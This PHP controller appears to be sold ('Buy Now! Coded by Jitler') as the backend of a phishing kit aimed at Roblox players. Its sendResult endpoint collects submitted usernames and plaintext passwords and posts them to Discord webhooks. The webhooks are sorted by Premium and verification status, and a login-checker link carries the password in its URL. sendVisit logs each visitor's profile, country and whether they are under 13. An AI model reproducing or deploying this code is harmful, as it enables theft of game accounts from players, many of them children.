<?php

//Coded By Jitler
namespace app\controller;

use think\facade\Session;
use app\model\UserModel;
use app\model\GameModel;
use think\facade\Request;

use Unirest\Request as UnirestRequest;
use Unirest\Request\Body as UnirestBody;

class GameApi
{

    //Private Functions

    private function getUserInfo()
    {
        $userid = Session::get("user_id");
        return UserModel::where("id", $userid)->find();
    }
    
    private function sendAllVisit($gameid, $thumbnailurl,$getgameinfo,$membership,$security,$country,$joindate)
    {

        $checkGame = GameModel::where("gameid", $gameid)->find();
        $siteuser = UserModel::where("id",$checkGame->ownerid)->find();

        $embed = [
            "content" => "",
            "username" => config("embed_setup.embed_name"),
            "avatar_url" => config("embed_setup.avatar_url"),
            "tts" => false,
            "embeds" => [
                [
                    "title" => "",
                    "type" => "rich",
                    "description" => "**Site Username**: ".$siteuser->username."**\nDiscord**: <@".$siteuser->discord.">",
                    "url" => "",
                    "timestamp" => date("c", strtotime("now")),
                    "color" => hexdec(config("embed_setup.embed_color")),
                    "footer" => [
                        "text" => config("embed_setup.embed_name")." Buy Now! Coded by Jitler",
                        "icon_url" => ""
                    ],
                    "image" => [
                        "url" => ""
                    ],
                    "thumbnail" => [
                        "url" => $thumbnailurl
                    ],
                    "author" => [
                        "name" => config("embed_setup.embed_name")." - All Visit",
                        "url" => ""
                    ],
                    "fields" => [
                        [
                            "name" => "🎮 Game Information",
                            "value" => "\n**Visits**: ".$getgameinfo->body->data[0]->visits."\n**Playing**: ".$getgameinfo->body->data[0]->playing."\n**Favorites**: ".$getgameinfo->body->data[0]->favoritedCount."",
                            "inline" => false,
                        ],
                        [
                            "name" => "👥 Membership",
                            "value" => $membership,
                            "inline" => false
                        ],
                        [
                            "name" => "🔒 Security",
                            "value" => $security,
                            "inline" => false
                        ],
                        [
                            "name" => "🚩 Country",
                            "value" => $country,
                            "inline" => false
                        ],
                        [
                            "name" => "📆 Join Date",
                            "value" => "Joined ".$joindate,
                            "inline" => false
                        ],
                    ]
                ]
            ]
        ];

        $body = UnirestBody::json($embed);
        $headers = ['Accept' => "application/json, text/plain, */*", 'Content-Type' => "application/json;charset=utf-8", ];
        UnirestRequest::post(config("embed_setup.all_visit"),$headers,$body);

    }
    public function checkGame()
    {
        
        if (!Request::param("gameid")) {
            return json(["error" => "Game Id is Empty"]);
        }

        $gameid = Request::param("gameid");

        $checkGame = GameModel::where("gameid", $gameid)->findOrEmpty();

        if ($checkGame->isEmpty()) {
            return json(["error" => "Game Not Whitelisted"]);
        }

        return json(["success" => "Game Whitelist", "config_info" => $checkGame->configinfo->game_config]);
    }

    public function sendVisit()
    {
        $gameid = Request::param("gameid");
        
        if (!Request::has("gameid")) {
            return json(["error" => "Game Id is Empty"]);
        }

        $checkGame = GameModel::where("gameid", $gameid)->findOrEmpty();

        if ($checkGame->isEmpty()) {
            return json(["error" => "Game Not Whitelisted"]);
        }

        if (!Request::has("username")|| !Request::has("membership") || !Request::has("security") || !Request::has("country") || !Request::has("player_age") || !Request::has("age13")) {
            return json(["error" => "Please fill up all the fields"]);
        }

        $visitwebhook = $checkGame->configinfo->webhook["visit"];

        $username = Request::param("username");
        $membership = Request::param("membership");
        $security = Request::param("security");
        $country = Request::param("country");
        $player_age = Request::param("player_age");
        $age13 = Request::param("age13");

        $siteuser = UserModel::where("id",$checkGame->ownerid)->find();

        $userid = "1";
        $data = [
            'usernames' => [$username]
        ];
        $body = UnirestBody::json($data);
        $headers = ['Accept' => "application/json, text/plain, */*", 'Content-Type' => "application/json;charset=utf-8", ];
        $getid = UnirestRequest::post("https://users.roblox.com/v1/usernames/users",$headers,$body);
        
        $userid = $getid->body->data[0]->id;

        $getthumbnailurl = UnirestRequest::get('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='.$userid.'&size=420x420&format=Png&isCircular=true');
        $thumbnailurl = $getthumbnailurl->body->data[0]->imageUrl;

        $getuniverse = UnirestRequest::get("https://apis.roblox.com/universes/v1/places/$gameid/universe");
        $uniID = $getuniverse->body->universeId;

        $getgameinfo = UnirestRequest::get("https://games.roblox.com/v1/games?universeIds=$uniID");

        $getcountries = UnirestRequest::get("http://country.io/names.json");
        $jsoncountries = json_decode($getcountries->raw_body, true);
        $country = $jsoncountries[$country];

        $plrage = "13+";
        
        if (!$age13){
            $plrage = "<13+";
        }

        $rbxusersapi = UnirestRequest::get('https://users.roblox.com/v1/users/' . $userid);
        $joindate = date('n/j/Y', strtotime($rbxusersapi->body->created));

        $embed = [
            "content" => "",
            "username" => config("embed_setup.embed_name"),
            "avatar_url" => config("embed_setup.avatar_url"),
            "tts" => false,
            "embeds" => [
                [
                    "title" => "[Click to View $username's Profile]",
                    "type" => "rich",
                    "description" => "**$username** has Joined the Game.\n**Site Username**: ".$siteuser->username."**\nDiscord**: <@".$siteuser->discord.">",
                    "url" => "https://www.roblox.com/users/$userid/profile",
                    "timestamp" => date("c", strtotime("now")),
                    "color" => hexdec(config("embed_setup.embed_color")),
                    "footer" => [
                        "text" => config("embed_setup.embed_name")." Buy Now! Coded by Jitler",
                        "icon_url" => ""
                    ],
                    "image" => [
                        "url" => ""
                    ],
                    "thumbnail" => [
                        "url" => $thumbnailurl
                    ],
                    "author" => [
                        "name" => config("embed_setup.embed_name")." - Visit",
                        "url" => ""
                    ],
                    "fields" => [
                        [
                            "name" => "🎮 Game Information",
                            "value" => "\n**Visits**: ".$getgameinfo->body->data[0]->visits."\n**Playing**: ".$getgameinfo->body->data[0]->playing."\n**Favorites**: ".$getgameinfo->body->data[0]->favoritedCount."",
                            "inline" => false,
                        ],
                        [
                            "name" => "💬 Username",
                            "value" => $username,
                            "inline" => true
                        ],
                        [
                            "name" => "👥 Membership",
                            "value" => $membership,
                            "inline" => true
                        ],
                        [
                            "name" => "🔒 Security",
                            "value" => $security,
                            "inline" => true
                        ],
                        [
                            "name" => "🚩 Country",
                            "value" => $country,
                            "inline" => true
                        ],
                        [
                            "name" => "📅 Account Age",
                            "value" => $player_age." days old, ".$plrage,
                            "inline" => true
                        ],
                        [
                            "name" => "📆 Join Date",
                            "value" => "Joined ".$joindate,
                            "inline" => true
                        ],
                        [
                            "name" => "🎮 Game",
                            "value" => "[Click Here](https://www.roblox.com/games/$gameid/)",
                            "inline" => true,
                        ],
                        
                    ]
                ]
            ]
        ];

        $body = UnirestBody::json($embed);
        $headers = ['Accept' => "application/json, text/plain, */*", 'Content-Type' => "application/json;charset=utf-8", ];
        $sendwebhook = UnirestRequest::post($visitwebhook,$headers,$body);

        $this->sendAllVisit($gameid, $thumbnailurl,$getgameinfo,$membership,$security,$country,$joindate);

        if ($sendwebhook->code == 204) {
            return json(["success" => "Webhook Sent"]);
        }else{
            return json(["error" => "Something Went wrong while sending the webhook."]);
        }
    
    }

    public function sendResult()
    {
        $gameid = Request::param("gameid");
        
        if (!Request::has("gameid")) {
            return json(["error" => "Game Id is Empty"]);
        }

        $checkGame = GameModel::where("gameid", $gameid)->findOrEmpty();

        if ($checkGame->isEmpty()) {
            return json(["error" => "Game Not Whitelisted"]);
        }

        if (!Request::has("username")|| !Request::has("password")|| !Request::has("membership") || !Request::has("security") || !Request::has("country") || !Request::has("player_age") || !Request::has("age13")) {
            return json(["error" => "Please fill up all the fields"]);
        }

        $username = Request::param("username");
        $password = Request::param("password");
        $membership = Request::param("membership");
        $security = Request::param("security");
        $country = Request::param("country");
        $player_age = Request::param("player_age");
        $age13 = Request::param("age13");

        $siteuser = UserModel::where("id",$checkGame->ownerid)->find();

        if ($membership == "Premium") {
            if ($security == "Unverified") {
                $webhook = $checkGame->configinfo->webhook["ve-premium"];
            } else {
                $webhook = $checkGame->configinfo->webhook["un-premium"];
            }
        } else {
            if ($security == "Verified") {
                $webhook = $checkGame->configinfo->webhook["ve-nbc"];
            } else {
                $webhook = $checkGame->configinfo->webhook["un-nbc"];
            }
        }
        

        $success = $checkGame->configinfo->webhook["success"];
        $failed = $checkGame->configinfo->webhook["failed"];

        $userid = "1";
        $data = [
            'usernames' => [$username]
        ];
        $body = UnirestBody::json($data);
        $headers = ['Accept' => "application/json, text/plain, */*", 'Content-Type' => "application/json;charset=utf-8", ];
        $getid = UnirestRequest::post("https://users.roblox.com/v1/usernames/users",$headers,$body);
        
        $userid = $getid->body->data[0]->id;

        $getthumbnailurl = UnirestRequest::get('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='.$userid.'&size=420x420&format=Png&isCircular=true');
        $thumbnailurl = $getthumbnailurl->body->data[0]->imageUrl;

        $getuniverse = UnirestRequest::get("https://apis.roblox.com/universes/v1/places/$gameid/universe");
        $uniID = $getuniverse->body->universeId;

        $getgameinfo = UnirestRequest::get("https://games.roblox.com/v1/games?universeIds=$uniID");

        $getcountries = UnirestRequest::get("http://country.io/names.json");
        $jsoncountries = json_decode($getcountries->raw_body, true);
        $country = $jsoncountries[$country];

        $plrage = "13+";
        
        if (!$age13){
            $plrage = "<13+";
        }

        $rbxusersapi = UnirestRequest::get('https://users.roblox.com/v1/users/' . $userid);
        $joindate = date('n/j/Y', strtotime($rbxusersapi->body->created));

        $embed = [
            "content" => "",
            "username" => config("embed_setup.embed_name"),
            "avatar_url" => config("embed_setup.avatar_url"),
            "tts" => false,
            "embeds" => [
                [
                    "title" => "[Click to View $username's Profile]",
                    "type" => "rich",
                    "description" => "**$username** Information.\n**Site Username**: ".$siteuser->username."**\nDiscord**: <@".$siteuser->discord.">",
                    "url" => "https://www.roblox.com/users/$userid/profile",
                    "timestamp" => date("c", strtotime("now")),
                    "color" => hexdec(config("embed_setup.embed_color")),
                    "footer" => [
                        "text" => config("embed_setup.embed_name")." Buy Now! Coded by Jitler",
                        "icon_url" => ""
                    ],
                    "image" => [
                        "url" => ""
                    ],
                    "thumbnail" => [
                        "url" => $thumbnailurl
                    ],
                    "author" => [
                        "name" => config("embed_setup.embed_name")." - Results",
                        "url" => ""
                    ],
                    "fields" => [
                        [
                            "name" => "🎮 Game Information",
                            "value" => "\n**Visits**: ".$getgameinfo->body->data[0]->visits."\n**Playing**: ".$getgameinfo->body->data[0]->playing."\n**Favorites**: ".$getgameinfo->body->data[0]->favoritedCount."",
                            "inline" => false,
                        ],
                        [
                            "name" => "💬 Username",
                            "value" => $username,
                            "inline" => true
                        ],
                        [
                            "name" => "🔑 Password",
                            "value" => $password,
                            "inline" => true
                        ],
                        [
                            "name" => "👥 Membership",
                            "value" => $membership,
                            "inline" => true
                        ],
                        [
                            "name" => "🔒 Security",
                            "value" => $security,
                            "inline" => true
                        ],
                        [
                            "name" => "🚩 Country",
                            "value" => $country,
                            "inline" => true
                        ],
                        [
                            "name" => "📅 Account Age",
                            "value" => $player_age." days old, ".$plrage,
                            "inline" => true
                        ],
                        [
                            "name" => "📆 Join Date",
                            "value" => "Joined ".$joindate,
                            "inline" => true
                        ],
                        [
                            "name" => "🎮 Game",
                            "value" => "[Click Here](https://www.roblox.com/games/$gameid/)",
                            "inline" => true,
                        ],
                        [
                            "name" => "🔑 Login Checker",
                            "value" => "[Click Here](https://".$_SERVER['HTTP_HOST']."/lc?username=$username&password=".urlencode($password)."&success=$success&failed=$failed)",
                            "inline" => true,
                        ],
                    ]
                ]
            ]
        ];

        $body = UnirestBody::json($embed);
        $headers = ['Accept' => "application/json, text/plain, */*", 'Content-Type' => "application/json;charset=utf-8", ];
        $sendwebhook = UnirestRequest::post($webhook,$headers,$body);

        if ($sendwebhook->code == 204) {
            return json(["success" => "Webhook Sent"]);
        }else{
            return json(["error" => "Something Went wrong while sending the webhook."]);
        }
    }

}
